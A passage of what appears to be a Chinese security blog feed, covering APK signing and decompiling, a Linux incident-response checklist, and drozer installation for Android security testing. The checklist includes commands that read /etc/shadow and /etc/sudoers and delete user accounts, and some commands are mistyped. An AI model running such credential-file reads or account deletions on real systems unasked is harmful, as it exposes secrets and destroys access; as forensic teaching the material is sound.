src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android/image-20211212220024774.png"></p><h2 id="APP签名"><a href="#APP签名" class="headerlink" title="APP签名"></a>APP签名</h2><p>使用APK上上签。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android-test/image-20211212220403730.png" alt="image-20211212220403730"></p><p>打开后直接将APK文件拖入即可自动化签名，签名完成以后在原APK目录下创建一个新文件，xxx_signed.apk。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android-test/image-20211106171050041.png" alt="image-20211106171050041"></p><h2 id="dex2jar反编译APP"><a href="#dex2jar反编译APP" class="headerlink" title="dex2jar反编译APP"></a>dex2jar反编译APP</h2><p>流程：classes.dex——&gt;classes.jar</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">usage：<br>d2j-dex2jar <span class="hljs-tag">&lt;<span class="hljs-name">dex</span> <span class="hljs-attr">filename</span>&gt;</span> -o <span class="hljs-tag">&lt;<span class="hljs-name">jar</span> <span class="hljs-attr">filename</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android-test/image-20211212220759452.png" alt="image-20211212220759452"></p><h2 id="smail编译成-dex文件"><a href="#smail编译成-dex文件" class="headerlink" title="smail编译成.dex文件"></a>smail编译成.dex文件</h2><p>流程：smali file * n——&gt; dex 文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">usage：<br><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>smail.<span class="hljs-keyword">jar </span>&lt;smali <span class="hljs-keyword">directory&gt; </span>-o &lt;dex <span class="hljs-keyword">directory+filename&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//Android-test/image-20211212221548025.png" alt="image-20211212221548025"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应-linux服务器排查</title>
    <link href="/2021/12/30/%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-linux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2021/12/30/%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5-linux%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="应急响应排查-Linux服务器"><a href="#应急响应排查-Linux服务器" class="headerlink" title="应急响应排查-Linux服务器"></a>应急响应排查-Linux服务器</h1><p><strong>查询特权用户</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">awk</span> -F: <span class="hljs-string">&#x27;<span class="hljs-variable">$3</span>==0&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> /etc/passwd<br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119101131608.png" alt="image-20211119101131608"></p><p><strong>查找远程可以登录的账户</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis">&gt; awk <span class="hljs-string">&#x27;/\<span class="hljs-variable">$1</span>|\<span class="hljs-variable">$5</span>|\<span class="hljs-variable">$6</span>/&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> /etc/shadow<br><br>- <span class="hljs-variable">$1</span>：MD5（长度 <span class="hljs-number">22</span>个字符）<br>- <span class="hljs-variable">$5</span>：SHA-<span class="hljs-number">256</span>（长度 <span class="hljs-number">43</span> 个字符）<br>- <span class="hljs-variable">$6</span>：SHA-<span class="hljs-number">512</span>（长度<span class="hljs-number">86</span> 个字符）<br></code></pre></td></tr></table></figure><ul><li>如下图，包含四个可远程登录账户</li></ul><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119101638529.png" alt="image-20211119101638529"></p><p><strong>检查sudo权限</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/etc/</span>sudoers | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;^#\|^$&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;ALL=(ALL&quot;</span>       <br></code></pre></td></tr></table></figure><p>如图，包含5个sudo权限被设置为all的账户</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119101802666.png" alt="image-20211119101802666"></p><p><strong>删除或锁定账号</strong></p><p>通过上面的步骤可以找到可疑的账号 </p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">usermod -L rooot #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头 <br>userdel rooot    #删除user用户 &gt; userdel -r rooot #将删除root用户，并且将/home目录下的root目录并删除  <br></code></pre></td></tr></table></figure><p><strong>查看当前登录系统的信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&gt; who    #查看当前登录用户（tty本地登陆  pts远程登录） <br>&gt; w      #查看系统信息，想知道某一时刻用户的行为 <br>&gt; uptime #查看登陆多久、多少用户，负载              <br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119102425015.png" alt="image-20211119102425015"></p><p><strong>检查异常端口</strong></p><p> 使用netstat 网络连接命令，分析可疑端口、IP、PID等信息。</p><p>如图</p><p>​                <img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119102745714.png"> </p><p><strong>抓包分析</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -c <span class="hljs-number">10</span> -q // <span class="hljs-number">10</span>个包<br></code></pre></td></tr></table></figure><p> 如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119102823034.png" alt="image-20211119102823034"></p><p><strong>使用ps命令检查可疑的进程</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ps -ef</span><br></code></pre></td></tr></table></figure><p> 如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119102913572.png" alt="image-20211119102913572"></p><p><strong>检查查系统中占用资源</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119103007150.png" alt="image-20211119103007150"></p><p><strong>发现异常进一步检查</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">ps echo command -p <span class="hljs-variable">$PID</span>  <span class="hljs-comment">#查看该进程启动的完整命令行 </span><br>readlink <span class="hljs-regexp">/proc/</span><span class="hljs-variable">$PID</span>/cwd <span class="hljs-comment">#查看该进程启动时候所在的目录 </span><br>ls -l <span class="hljs-regexp">/proc/</span><span class="hljs-variable">$PID</span>/exe    <span class="hljs-comment">#查看下pid所对应的进程文件路径 </span><br>strings -f <span class="hljs-regexp">/proc/</span><span class="hljs-variable">$PID</span>/environ | cut -f2 -d <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#查看该进程启动时的完整环境变量: </span><br>lsof -p <span class="hljs-variable">$PID</span> <span class="hljs-comment">#列出该进程所打开的所有文件   </span><br></code></pre></td></tr></table></figure><p><strong>检查系统服务</strong></p><p>Linux系统服务管理，CentOS7使用systemd控制  CentOS6之前使用chkconfig控制。 查看正在运行的服务 </p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">service --<span class="hljs-keyword">status</span>-<span class="hljs-built_in">all</span> | grep running<br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119104105196.png" alt="image-20211119104105196"></p><p><strong>检查开机自启的服务</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">//对于<span class="hljs-string">systemd</span>服务管理器来说，可以通过下述方式查看开机自启的服务 <br><br><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-unit-files</span> <span class="hljs-built_in">--type=service</span> | <span class="hljs-string">grep</span> <span class="hljs-string">&quot;enabled&quot;</span> <br><br>//<span class="hljs-string">chkconfig</span>就是<span class="hljs-string">CentOS6</span>以前用来控制系统服务的工具，查看服务自启动状态 <br><br><span class="hljs-string">chkconfig</span> <span class="hljs-built_in">--list</span> | <span class="hljs-string">grep</span> <span class="hljs-string">&quot;3:on\|5:on&quot;</span>  <br></code></pre></td></tr></table></figure><pre><code>                             ![image-20211119105421321](https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119105421321.png)</code></pre><p><strong>检查启动项脚本</strong></p><p>命令查看下开机启动项中是否有异常的启动服务。 </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>rc.local              <br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119110817067.png" alt="image-20211119110817067"></p><p><strong>检查计划任务</strong></p><p>利用计划任务进行权限维持，可作为一种持久性机制被入侵者利用。检查异常的计划任务，需要重点关注以下目录中是否存在恶意脚本。              </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>*<br><span class="hljs-regexp">/etc/</span>crontab <span class="hljs-regexp">/etc/</span>cron.d/*<br><span class="hljs-regexp">/etc/</span>cron.daily<span class="hljs-regexp">/*  /</span>etc<span class="hljs-regexp">/cron.hourly/</span>*<br><span class="hljs-regexp">/etc/</span>cron.monthly/*<br><span class="hljs-regexp">/etc/</span>cron.weekly/<br><span class="hljs-regexp">/etc/</span>anacrontab<br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/anacron/</span>*<br></code></pre></td></tr></table></figure><p>crontab -l 可指定用户查看计划任务，参数留空默认查询当前用户，如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119110616393.png" alt="image-20211119110616393"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> `cat /etc/passwd | cut -d<span class="hljs-string">&quot;:&quot;</span> -f1`;<span class="hljs-keyword">do</span> crontab -l -u <span class="hljs-variable">$u</span>;<span class="hljs-keyword">done</span>  //检查所有用户计划任务<br></code></pre></td></tr></table></figure><p><strong>检查系统的异常文件</strong></p><p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以.为名的文件夹具有隐藏属性</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> <br></code></pre></td></tr></table></figure><p>查找n天以内被访问过的文件              </p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">find</span> /opt -iname <span class="hljs-string">&quot;*&quot;</span> -atime <span class="hljs-number">1</span> -<span class="hljs-keyword">type</span> f<br>#-iname不区分大小写,-atime最近一次被访问的时间,-<span class="hljs-keyword">type</span>文件类型 <br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119141214557.png" alt="image-20211119141214557"></p><p><strong>检查历史命令</strong></p><p>查看被入侵后,在系统上执行过哪些命令,使用root用户登录系统，检查/home目录下的用户主目录的.bash_history文件，系统默认可以保存1000条的历史命令，并不记录命令执行的时间，根据需要进行安全加固。              </p><p><strong>检查系统日志</strong></p><p>在Linux上一般跟系统相关的日志默认都会放到/var/log下面， 若是一旦出现问题，用户就可以通过查看日志来迅速定位， 及时解决问题。常用日志文件如下：              </p><p><strong>/var/log/btmp</strong></p><p>记录错误登录日志,这个文件是二进制文件,不能用vi直接查看,可以用lastb看              </p><p><strong>/var/log/lastlog</strong></p><p>记录系统中所有用户最后一次成功登录系统的时间,这是一个二进制文件,不能用vi查看,可以用lastlog查看              <strong>/var/log/wtmp</strong></p><p>​                永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。 同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看。              </p><p><strong>/var/log/utmp</strong></p><p>​                记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化， 只记录当前登录用户的信息。同样这个文件不能直接vi， 而要使用w,who,users等命令来查询。              </p><p><strong>/var/log/secure</strong></p><p>​                记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录， 比如SSH登录，su切换用户，sudo授权， 甚至添加用户和修改用户密码都会记录在这个日志文件中            </p><p>之前提到的last、lastlog记录并不准确，还可以用以下命令来查询登录情况</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/var/</span>log/secure | <span class="hljs-keyword">grep</span> -E <span class="hljs-string">&quot;Accepted|Failed&quot;</span>          <br></code></pre></td></tr></table></figure><p><strong>查找登录系统失败的20个账号</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">lastb | <span class="hljs-type">awk</span> &#x27;&#123;print $<span class="hljs-number">1</span>&#125;&#x27; | <span class="hljs-type">sort</span> | <span class="hljs-type">uniq</span> -c | <span class="hljs-type">sort</span> -nr | <span class="hljs-type">head</span> -n <span class="hljs-number">20</span>              <br></code></pre></td></tr></table></figure><p><strong>定位有多少IP在爆破主机的root帐号</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;Failed password for root&quot;</span> <span class="hljs-regexp">/var/</span>log/secure | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr | more       <br></code></pre></td></tr></table></figure><p>如图</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//%E5%BA%94%E6%80%A5linux%E6%9C%8D%E5%8A%A1%E5%99%A8/image-20211119141037212.png" alt="image-20211119141037212"></p><p><strong>查看所有重启日志信息</strong></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">last</span> reboot              <br></code></pre></td></tr></table></figure><p><strong>查看系统正常的运行时间</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">uptime -s</span><br></code></pre></td></tr></table></figure><p><strong>查看哪些IP登录成功了</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">grep <span class="hljs-string">&quot;Accepted&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$11&#125;</span>&#x27; | <span class="hljs-keyword">sort</span> | uniq -c | <span class="hljs-keyword">sort</span> -nr | <span class="hljs-keyword">more</span>   <br></code></pre></td></tr></table></figure><p><strong>登录成功的日期,用户名,IP</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">gerp <span class="hljs-string">&quot;Accepted&quot;</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/secure | awk &#x27;&#123;<span class="hljs-keyword">print</span> <span class="hljs-variable">$1</span>,<span class="hljs-variable">$2</span>,<span class="hljs-variable">$3</span>,<span class="hljs-variable">$9</span>,<span class="hljs-variable">$11&#125;</span>&#x27;              <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>drozer安装及使用</title>
    <link href="/2021/10/02/drozer%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/10/02/drozer%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="drozer安装及使用"><a href="#drozer安装及使用" class="headerlink" title="drozer安装及使用"></a>drozer安装及使用</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>drozer是一款针对Android系统的安全测试框架，可以分成两个部分：其一是“console”，它运行在本地计算机上；其二是“server”，它是一个安装在目标Android设备上的app，当使用console与Android设备交互时，就是把Java代码输入到运行在实际设备上的drozer代理(agent)中。<br>        根据drozer官方的描述，drozer主要是有助于Android研究人员去测试一些共享的Android漏洞，对于远程攻击，可以生成shellcode来帮助开发人员将drozer Agent 部署为远程管理员工具，从而最大程度利用设备。<br>drozer是一个全面的安全审计和攻击框架，可以进行更快的Android安全评估，通过自动化繁琐和耗时的工作，帮助减少Android安全评估所花费的时间。还可以针对真实的Android设备进行测试，drozer不需要启用USB调试或其他开发功能，还可以自动化和扩展，测试公共漏洞的暴露程度。</p><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">drozer官方地址：https:<span class="hljs-regexp">//</span>labs.f-secure.com<span class="hljs-regexp">/tools/</span>drozer/<br>drozer github：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mwrlabs/</span>drozer<br>下载及drozer用户手册：https:<span class="hljs-regexp">//</span>labs.mwrinfosecurity.com<span class="hljs-regexp">/tools/</span>drozer/<br></code></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>python版本：python 2.7.18        # 理论上是python就行，我这里的版本为2.7.18</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wget</span> <span class="hljs-string">https</span>://<span class="hljs-string">github</span>.<span class="hljs-string">com</span>/<span class="hljs-string">FSecureLABS</span>/<span class="hljs-string">drozer</span>/<span class="hljs-string">releases</span>/<span class="hljs-string">download</span>/<span class="hljs-string">2</span>.<span class="hljs-string">4</span>.<span class="hljs-string">4</span>/<span class="hljs-string">drozer-2</span>.<span class="hljs-string">4</span>.<span class="hljs-string">4-py2-none-any</span>.<span class="hljs-string">whl</span> <span class="hljs-comment">##下载drozer</span><br><br><span class="hljs-comment"># 安装python2的pip</span><br><span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-string">pip</span>/<span class="hljs-string">2</span>.<span class="hljs-string">7</span>/<span class="hljs-built_in">get-pip.py</span><br><span class="hljs-built_in">python2</span> <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">#</span> 安装<span class="hljs-string">drozer</span>的依赖<br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">wheel</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">pyyaml</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">pyhamcrest</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">protobuf</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">pyopenssl</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">twisted</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">service_identity</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 安装drozer</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">drozer-2</span>.<span class="hljs-string">4</span>.<span class="hljs-string">4-py2-none-any</span>.<span class="hljs-string">whl</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 安装adb</span><br><span class="hljs-string">apt-get</span> <span class="hljs-string">install</span> <span class="hljs-string">adb</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 使用</span><br>在客户端中打开<span class="hljs-string">31415</span>端口，然后进行端口转发<br><span class="hljs-string">adb</span> <span class="hljs-string">forward</span> <span class="hljs-string">tcp:31415 </span><span class="hljs-string">tcp:31415</span><br><span class="hljs-string">drozer </span><span class="hljs-string">console</span> <span class="hljs-string">connect</span><br></code></pre></td></tr></table></figure><p>jdk8安装：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">dk安装包下载：https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/java/</span>technologies<span class="hljs-regexp">/javase/</span>javase8u211-later-archive-downloads.html<br>下载tar.gz结尾的包，我这里用的是：jdk-<span class="hljs-number">8</span>u212-linux-x64.tar.gz<br><br><span class="hljs-comment"># 创建目录</span><br>mkdir <span class="hljs-regexp">/usr/</span>lib/java<br>tar -zxvf jdk-<span class="hljs-number">8</span>u212-linux-x64.tar.gz -C <span class="hljs-regexp">/usr/</span>lib/java<br><br><span class="hljs-comment"># 添加环境变量</span><br>vim .bashrc<br>在文件末尾追加下面内容：<br><span class="hljs-comment">#set oracle jdk environmentexport JAVA_HOME=/usr/lib/java/jdk1.8.0_212  ## 这里要注意目录要换成自己解压的jdk 目录</span><br>export JRE_HOME=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br>export CLASSPATH=.:<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span><span class="hljs-regexp">/lib:$&#123;JRE_HOME&#125;/</span>lib<br>export PATH=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="hljs-variable">$PATH</span>  使环境变量马上生效<br><br>source ~/.bashrc        使环境变量立即生效<br><br><span class="hljs-comment"># 设置系统默认jdk版本：</span><br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/java java /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/java <span class="hljs-number">300</span><br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/javac javac /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/javac <span class="hljs-number">300</span><br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/jar jar /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/jar <span class="hljs-number">300</span>  <br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/javah javah /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/javah <span class="hljs-number">300</span>  <br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/javap javap /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/javap <span class="hljs-number">300</span><br><br><span class="hljs-comment"># 验证是否配置成功</span><br>root@kali:<span class="hljs-regexp">/usr/</span>bin<span class="hljs-comment"># update-alternatives --config java</span><br>链接组 java (提供 <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/java)中只有一个候选项：/u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/java<br>无需配置。<br><br><span class="hljs-comment"># 测试jdk：</span><br>root@kali:<span class="hljs-regexp">/usr/</span>bin<span class="hljs-comment"># java -version</span><br>java version <span class="hljs-string">&quot;1.8.0_212&quot;</span><br>Java(TM) SE Runtime Environment (build <span class="hljs-number">1.8</span>.<span class="hljs-number">0</span>_212-b15)<br>Java HotSpot(TM) <span class="hljs-number">64</span>-Bit Server VM (build <span class="hljs-number">24.80</span>-b11, mixed mode)<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="列出已安装的app包的列表"><a href="#列出已安装的app包的列表" class="headerlink" title="列出已安装的app包的列表"></a>列出已安装的app包的列表</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">run</span> <span class="hljs-keyword">app</span>.package.<span class="hljs-keyword">list</span><br>若drozer失效可使用adb，使用方法如下所示:<br>adb <span class="hljs-keyword">shell</span> <br>pm <span class="hljs-keyword">list</span> package<br></code></pre></td></tr></table></figure><h3 id="列出app的详细信息"><a href="#列出app的详细信息" class="headerlink" title="列出app的详细信息"></a>列出app的详细信息</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 